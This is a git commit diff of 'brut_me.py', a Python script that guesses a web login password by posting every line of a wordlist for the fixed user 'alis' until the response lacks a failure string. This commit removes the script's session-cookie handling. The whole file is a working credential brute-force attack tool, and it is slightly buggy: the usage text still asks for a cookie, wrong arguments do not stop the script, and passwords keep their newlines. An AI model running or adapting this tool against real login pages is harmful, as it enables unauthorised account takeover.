627d8c17949ca3c94fe8f5503865a1a03fb4d6a6
6776aki <user07028aki@gmail.com>
2023-03-11 20:24:24 +0530

    removed cookie

--- brut_me.py
+++ brut_me.py
@@ -1,36 +1,34 @@
 import requests
 import sys
 
-def Cracker(url,cookie,identifier,file):
-    f = open(file,"rb")
+def Cracker(url,identifier,file):
+    f = open(file,"r")
     line = f.readlines()
     for line in line:
-        data = {"username":"alis","password":f"{line.decode()}"}
-        cookie = {"session":f"{cookie}"}
-        r = requests.post(url,cookies=cookie,data=data)
+        data = {"username":"alis","password":f"{line}"}
+        r = requests.post(url,data=data)
         res_text = r.text
         if identifier not in res_text:
             print("PASSWORD IS CRACKED SUCCESFULLY!")
-            sys.stdout.write("(+) password =>"+"\r"+ f"{line.decode()}")
-            sys.stdout.flush()
+            print(line)
+            print(res_text)
             break
         else:
-            print("Password =>"+line.decode())
+            print("Password =>"+line)
             sys.stdout.write("\033[F")
             sys.stdout.flush()
 
 
 def main():
-    if len(sys.argv) != 5:
+    if len(sys.argv) != 4:
         print("(+) Usage: %s <url> <cookie> <identifier> <file_name>" % sys.argv[0])
-        print("(+) Example: %s www.example.com <session_cookie> Invalid password rockyou.txt"% sys.argv[0])
+        print("(+) Example: %s www.example.com Invalid password rockyou.txt"% sys.argv[0])
     
     url = sys.argv[1]
-    cookie = sys.argv[2]
-    identifier = sys.argv[3] 
-    file = sys.argv[4]
+    identifier = sys.argv[2] 
+    file = sys.argv[3]
     print("(+) Retrieving password.....")
-    Cracker(url,cookie,identifier,file)
+    Cracker(url,identifier,file)
     
         
 if __name__ == "__main__":
